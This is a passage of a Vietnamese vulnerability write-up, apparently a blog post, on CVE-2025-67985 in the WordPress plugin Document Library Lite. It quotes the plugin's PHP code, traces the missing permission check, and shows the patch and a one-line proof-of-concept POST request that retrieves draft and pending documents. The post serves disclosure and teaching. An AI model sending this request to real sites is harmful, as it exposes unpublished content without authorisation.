- &lt;strong&gt;Document Library Lite&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.6&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.2.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;Lỗ hổng được công bố ảnh hưởng từ phiên bản 1.1.7 trở xuống nhưng thực chất đã được vá trong phiên bản 1.1.7. Ta tải xuống phiên bản 1.1.6 để phân tích.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_dll_load_posts&amp;#39;, [ $this, &amp;#39;load_posts&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; là hook dành cho tất cả người dùng (kể cả chưa đăng nhập). Bất kỳ ai đều có thể gọi AJAX action:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/admin-ajax.php?action=dll_load_posts&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Và thực thi hàm &lt;code&gt;load_posts()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const SHORTCODE = &amp;#39;doc_library&amp;#39;;&#xA;public function load_posts() {&#xA;    $args = Options::handle_shortcode_attribute_aliases( $_POST[ &amp;#39;args&amp;#39; ] );&#xA;    $args = shortcode_atts( Options::get_defaults(), $args, self::SHORTCODE );&#xA;&#xA;    $table = new simple_Document_Library( $args );&#xA;    $response = $table-&amp;gt;get_table( &amp;#39;array&amp;#39; );&#xA;&#xA;    // Return the response as JSON&#xA;    wp_send_json($response);   &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;load_posts()&lt;/code&gt; gọi đến &lt;code&gt;handle_shortcode_attribute_aliases&lt;/code&gt; với tham số đầu vào &lt;code&gt;$_POST[ &#39;args&#39; ]&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function handle_shortcode_attribute_aliases( $atts ) {&#xA;    if ( isset( $atts[&amp;#39;content&amp;#39;] ) ) {&#xA;        $atts[&amp;#39;columns&amp;#39;] = $atts[&amp;#39;content&amp;#39;];&#xA;        unset( $atts[&amp;#39;content&amp;#39;] );&#xA;    }&#xA;&#xA;    if ( isset( $atts[&amp;#39;docs_per_page&amp;#39;] ) ) {&#xA;        $atts[&amp;#39;rows_per_page&amp;#39;] = $atts[&amp;#39;docs_per_page&amp;#39;];&#xA;        unset( $atts[&amp;#39;docs_per_page&amp;#39;] );&#xA;    }&#xA;&#xA;    return $atts;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này chỉ thực hiện ánh xạ (đổi tên) tham số:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;content&lt;/code&gt; → &lt;code&gt;columns&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;docs_per_page&lt;/code&gt; → &lt;code&gt;rows_per_page&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Sau đó trả lại mảng &lt;code&gt;$atts&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tiếp theo hàm &lt;code&gt;load_posts()&lt;/code&gt; gọi đến:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$args = shortcode_atts( Options::get_defaults(), $args, self::SHORTCODE );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;nhằm gộp tham số mặc định (&lt;code&gt;Options::get_defaults()&lt;/code&gt;) với &lt;code&gt;$args&lt;/code&gt; do người dùng truyền vào:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/option.png&#34; title=&#34;Các option mặc định của shortcode&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/option.png&#34; data-sub-html=&#34;&lt;h2&gt;Option&lt;/h2&gt;&lt;p&gt;Các option mặc định của shortcode&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/option.png&#39; alt=&#34;Option&#34; height=&#34;475&#34; width=&#34;669&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Các option mặc định của shortcode&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong đó, &lt;code&gt;status&lt;/code&gt; quyết định trạng thái document được hiển thị.&lt;/p&gt;&#xA;&lt;p&gt;Có thể thay đổi status của Document khi tạo/edit:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/status.png&#34; title=&#34;Thay đối status&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/status.png&#34; data-sub-html=&#34;&lt;h2&gt;Status&lt;/h2&gt;&lt;p&gt;Thay đối status&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/status.png&#39; alt=&#34;Status&#34; height=&#34;581&#34; width=&#34;1518&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Thay đối status&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;pending&lt;/code&gt; và &lt;code&gt;draft&lt;/code&gt; là trạng thái chưa công khai của document. Chỉ những người có quyền mới xem được.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;load_posts()&lt;/code&gt; khởi tạo &lt;code&gt;simple_Document_Library&lt;/code&gt; với &lt;code&gt;$args&lt;/code&gt; do người dùng cung cấp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$table = new simple_Document_Library( $args );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;validate_options()&lt;/code&gt; được gọi trong constructor của &lt;code&gt;simple_Document_Library&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __construct( $args ) {&#xA;    $this-&amp;gt;args = $this-&amp;gt;validate_options( $args );&#xA;    $this-&amp;gt;set_post_args();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ở đây không chỉ tồn tại 3 trạng thái: &lt;code&gt;publish&lt;/code&gt;, &lt;code&gt;pending&lt;/code&gt;, &lt;code&gt;draft&lt;/code&gt; mà còn 2 trạng thái &lt;code&gt;future&lt;/code&gt; và &lt;code&gt;any&lt;/code&gt; xuất hiện trong hàm &lt;code&gt;validate_options&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function validate_options( $args ) {&#xA;    // Validate all the boolean options in the database&#xA;    $boolean_options = [ &amp;#39;lazy_load&amp;#39;, &amp;#39;lightbox&amp;#39;, &amp;#39;wrap&amp;#39;, &amp;#39;search_on_click&amp;#39; ];&#xA;&#xA;    foreach( $boolean_options as $option ) {&#xA;        $args[ $option ] = is_string( $args[ $option ] ) ? $args[ $option ] === &amp;#34;true&amp;#34; : $args[ $option ];&#xA;    }&#xA;&#xA;    // The post status can only have these values&#xA;    $valid_post_statuses = [ &amp;#39;publish&amp;#39;, &amp;#39;pending&amp;#39;, &amp;#39;draft&amp;#39;, &amp;#39;future&amp;#39;, &amp;#39;any&amp;#39; ];&#xA;    $args[ &amp;#39;status&amp;#39; ] = in_array( $args[&amp;#39;status&amp;#39;], $valid_post_statuses ) ? $args[ &amp;#39;status&amp;#39; ] : &amp;#39;publish&amp;#39;;&#xA;    &#xA;    return $args;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này chỉ kiểm tra giá trị hợp lệ, không kiểm tra quyền.&lt;/p&gt;&#xA;&lt;p&gt;status cho phép &lt;code&gt;pending&lt;/code&gt;, &lt;code&gt;draft&lt;/code&gt;, &lt;code&gt;future&lt;/code&gt;, &lt;code&gt;any&lt;/code&gt;, nên user có thể dùng các giá trị này để xem document chưa được phép công khai → &lt;strong&gt;bypass phân quyền&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$response = $table-&amp;gt;get_table( &amp;#39;array&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_table&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_table( $output_type = &amp;#39;html&amp;#39; ) {&#xA;    $columns = $this-&amp;gt;get_columns();&#xA;&#xA;    // Parse DataTables parameters from the AJAX request&#xA;    $draw   = isset( $_POST[&amp;#39;draw&amp;#39;] ) ? intval( $_POST[&amp;#39;draw&amp;#39;] ) : 1;&#xA;    $this-&amp;gt;args[&amp;#39;offset&amp;#39;]  = isset( $_POST[&amp;#39;start&amp;#39;] ) ? intval( $_POST[&amp;#39;start&amp;#39;] ) : 0;&#xA;    $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = isset( $_POST[&amp;#39;length&amp;#39;] ) &amp;amp;&amp;amp; intval( $_POST[&amp;#39;length&amp;#39;] ) !== -1 ? intval( $_POST[&amp;#39;length&amp;#39;] ) : $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;];&#xA;    $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] = isset( $_POST[&amp;#39;order&amp;#39;] ) ? $columns[$_POST[&amp;#39;order&amp;#39;][0][&amp;#39;column&amp;#39;]] : $this-&amp;gt;get_orderby();&#xA;    $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = isset( $_POST[&amp;#39;order&amp;#39;] ) ? $_POST[&amp;#39;order&amp;#39;][0][&amp;#39;dir&amp;#39;] : $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;];&#xA;    $this-&amp;gt;args[&amp;#39;search_value&amp;#39;] = isset( $_POST[&amp;#39;search&amp;#39;] ) ? $_POST[&amp;#39;search&amp;#39;][&amp;#39;value&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = filter_var( $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;], FILTER_VALIDATE_INT );&#xA;&#xA;    if ( $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] &amp;lt; 1 || ! $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] ) {&#xA;        $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = false;&#xA;    }&#xA;    if( isset( $_POST[&amp;#39;category&amp;#39;] ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;doc_category&amp;#39;] = $_POST[&amp;#39;category&amp;#39;];&#xA;    }&#xA;&#xA;    if ( ! in_array( $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;], Options::get_allowed_columns(), true ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] = Options::get_default_settings()[&amp;#39;sort_by&amp;#39;];&#xA;    }&#xA;&#xA;    if ( ! in_array( $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;], [ &amp;#39;asc&amp;#39;, &amp;#39;desc&amp;#39; ], true ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = Options::get_default_settings()[&amp;#39;sort_order&amp;#39;];&#xA;    }&#xA;&#xA;    // Set default sort direction&#xA;    if ( ! $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] ) {&#xA;        if ( $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] === &amp;#39;date&amp;#39; ) {&#xA;            $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = &amp;#39;desc&amp;#39;;&#xA;        } else {&#xA;            $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = &amp;#39;asc&amp;#39;;&#xA;        }&#xA;    }&#xA;&#xA;    $this-&amp;gt;args[&amp;#39;content_length&amp;#39;]  = filter_var( $this-&amp;gt;args[&amp;#39;content_length&amp;#39;], FILTER_VALIDATE_INT );&#xA;    $this-&amp;gt;args[&amp;#39;scroll_offset&amp;#39;]   = filter_var( $this-&amp;gt;args[&amp;#39;scroll_offset&amp;#39;], FILTER_VALIDATE_INT );&#xA;&#xA;    if ( empty( $this-&amp;gt;args[&amp;#39;date_format&amp;#39;] ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;date_format&amp;#39;] = Options::get_default_settings()[&amp;#39;date_format&amp;#39;];&#xA;    }&#xA;&#xA;    $output       = &amp;#39;&amp;#39;;&#xA;    $table_body   = &amp;#39;&amp;#39;;&#xA;    $body_row_fmt = &amp;#39;&amp;#39;;&#xA;&#xA;    // After an AJAX request, the paramaters should be set again&#xA;    $this-&amp;gt;set_post_args();&#xA;    // Get all published posts in the current language&#xA;    $all_posts = $this-&amp;gt;run_table_query( $this-&amp;gt;build_table_query( $this-&amp;gt;post_args ) );&#xA;&#xA;    // Bail early if no posts found&#xA;    if ( ! $all_posts || ! is_array( $all_posts ) ) {&#xA;        return $output;&#xA;    }&#xA;    &#xA;    // Add placeholder to table body format string so that content for this column is included in table output&#xA;    $cell_fmt     = &amp;#39;&amp;lt;td&amp;gt;{%s}&amp;lt;/td&amp;gt;&amp;#39;;&#xA;    $array_output = [];&#xA;    foreach ( $columns as $column ) {&#xA;        $body_row_fmt .= sprintf( $cell_fmt, $column );&#xA;    }&#xA;    if ( $output_type === &amp;#39;html&amp;#39; ) {&#xA;        // Build table body&#xA;        $body_row_fmt = &amp;#39;&amp;lt;tr&amp;gt;&amp;#39; . $body_row_fmt . &amp;#39;&amp;lt;/tr&amp;gt;&amp;#39;;&#xA;&#xA;        // Loop through posts and add a row for each&#xA;        foreach ( (array) $all_posts as $_post ) {&#xA;            setup_postdata( $_post );&#xA;&#xA;            $post_data_trans = apply_filters(&#xA;                &amp;#39;document_library_table_row_data_format&amp;#39;,&#xA;                $this-&amp;gt;get_row_content( $_post )&#xA;            );&#xA;&#xA;            $table_body .= strtr( $body_row_fmt, $post_data_trans );&#xA;        } // foreach post&#xA;&#xA;        wp_reset_postdata();&#xA;        return $table_body;&#xA;    } else {&#xA;        // Loop through posts and add a row for each&#xA;        foreach ( (array) $all_posts as $_post ) {&#xA;            setup_postdata( $_post );&#xA;            $array_output[] = $this-&amp;gt;get_row_content( $_post );&#xA;        }&#xA;    }&#xA;&#xA;    // Increment the table count&#xA;    &amp;#43;&amp;#43;self::$table_count;&#xA;    if ( $output_type === &amp;#39;html&amp;#39; ) {&#xA;        return apply_filters( &amp;#39;document_library_table_html_output&amp;#39;, $output, $this-&amp;gt;args );&#xA;    } else {&#xA;        $total_posts = $this-&amp;gt;get_total_posts();&#xA;&#xA;        // Prepare the response&#xA;        $response = [&#xA;            &amp;#39;draw&amp;#39;            =&amp;gt; $draw,&#xA;            &amp;#39;recordsTotal&amp;#39;    =&amp;gt; $total_posts,&#xA;            &amp;#39;recordsFiltered&amp;#39; =&amp;gt; $total_posts, // You can filter further if you add search functionality&#xA;            &amp;#39;data&amp;#39;            =&amp;gt; $array_output,&#xA;        ];&#xA;&#xA;        wp_send_json( $response );&#xA;&#xA;        // return &amp;#34;&amp;#34;;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_table()&lt;/code&gt; lấy nhiều tham số trực tiếp từ &lt;code&gt;$_POST&lt;/code&gt;, gán vào &lt;code&gt;$this-&amp;gt;args&lt;/code&gt; và dùng chúng để xây dựng, thực thi truy vấn document mà &lt;strong&gt;không kiểm tra quyền người dùng&lt;/strong&gt;. Do &lt;code&gt;$args&lt;/code&gt; ban đầu (bao gồm &lt;code&gt;status&lt;/code&gt;) là dữ liệu do client kiểm soát, người dùng có thể truy vấn và nhận về các document ở trạng thái &lt;code&gt;pending&lt;/code&gt; hoặc &lt;code&gt;draft&lt;/code&gt;, kết quả được trả thẳng qua JSON, dẫn tới &lt;strong&gt;bypass phân quyền / IDOR&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Cuối cùng, &lt;code&gt;wp_send_json($response)&lt;/code&gt; &lt;strong&gt;trả toàn bộ dữ liệu document cho client&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_send_json($response);   &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã chặn triệt để lỗ hổng bằng cách:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ép user chưa đăng nhập chỉ được xem document &lt;code&gt;publish&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Nếu status khác &lt;code&gt;publish&lt;/code&gt; mà người dùng không có quyền &lt;code&gt;edit_posts&lt;/code&gt; =&amp;gt; trả về &lt;code&gt;error&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/patch.png&#34; title=&#34;Bản vá&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/patch.png&#39; alt=&#34;Patch&#34; height=&#34;612&#34; width=&#34;1519&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Unauthenticated user&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-admin/admin-ajax.php?action=dll_load_posts with args[status]=pending|draft|future|any&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;wp_ajax_nopriv_dll_load_posts hook triggered&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Ajax_Handler::load_posts()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Read user-controlled $_POST[&amp;#39;args&amp;#39;]&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Options::handle_shortcode_attribute_aliases()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Merge with default options via shortcode_atts()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Initialize simple_Document_Library($args)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;validate_options(): only validate value, no permission check&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;status accepted: publish/pending/draft/future/any&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Build query using user-controlled status&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Query documents including non-public ones&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;get_table(&amp;#39;array&amp;#39;)&amp;#34;]&#xA;M --&amp;gt; N[&amp;#34;wp_send_json(response)&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;Non-public documents returned to user&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Gửi request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;&#xA;action=dll_load_posts&amp;amp;args[status]=any&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/result.png&#39; alt=&#34;Result&#34; height=&#34;856&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xảy ra do AJAX endpoint công khai tin tưởng tham số &lt;code&gt;status&lt;/code&gt; do client kiểm soát và sử dụng trực tiếp để truy vấn document mà không kiểm tra quyền. Điều này cho phép người dùng chưa đăng nhập truy cập các document chưa được công khai, dẫn đến bypass kiểm soát truy cập / IDOR.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Validation không thay thế cho authorization&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; là bề mặt tấn công công khai&lt;/li&gt;&#xA;&lt;li&gt;Tham số ảnh hưởng truy vấn phải được ràng buộc theo quyền&lt;/li&gt;&#xA;&lt;li&gt;Trả JSON không kiểm soát quyền có thể gây rò rỉ dữ liệu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 